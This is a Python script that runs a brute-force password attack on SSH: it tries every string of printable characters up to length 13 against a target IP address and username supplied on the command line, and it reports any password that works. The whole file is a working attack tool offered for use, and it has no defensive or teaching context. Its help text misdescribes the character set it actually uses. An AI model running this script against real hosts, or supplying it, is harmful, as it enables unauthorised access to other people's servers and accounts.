import string
import itertools
import paramiko
from tqdm import tqdm
import time
import argparse

def bruteforce_ssh(ip_addr,username):
    min_length=1
    max_length=13
    password=''

    alnum=list(string.printable)
    total_attempts = sum(len(alnum) ** length for length in range(min_length, max_length + 1))
    count=0
    for length in range(min_length,max_length+1):
        for i in tqdm(itertools.product(alnum, repeat=length), total=total_attempts, desc="Brute Force Progress"):
            password=''.join(i)
            
            success=ssh_connect(ip_addr,username,password)
 
            count+=1
            if success:
                print("Total Attempts:"+str(count))
                return success,password
    return False,None

def ssh_connect(ip_addr,username,password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip_addr, username=username, password=password, timeout=1)
        print("SSH connection successful!")
        client.close()
        return True
    except paramiko.AuthenticationException:
        #print("Auth failed.")
        return False
    except paramiko.SSHException as e:
        #print(f"\nSSHException: {e}. Retrying...")
        print("Retrying...")
        time.sleep(2)
        success=ssh_connect(ip_addr,username,password)
        return success
    except Exception as e:
        #print(f"An error occurred: {e}")
        print("An error occurred...")
        return False
    
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Alphabet-based brute force (a-zA-Z0-9!@#)')
    parser.add_argument('target_ip_addr', help='IP of target')
    parser.add_argument('target_user_name', help='Username of target')
    
    args = parser.parse_args()
    ip_addr = args.target_ip_addr
    user_name = args.target_user_name
    print(f"[*] Starting brute force attack on {ip_addr} with username {user_name}")
    success,password=bruteforce_ssh(ip_addr,user_name)
    if success:
        print(f"Password found: {password}")
    else:
        print("No valid password found.")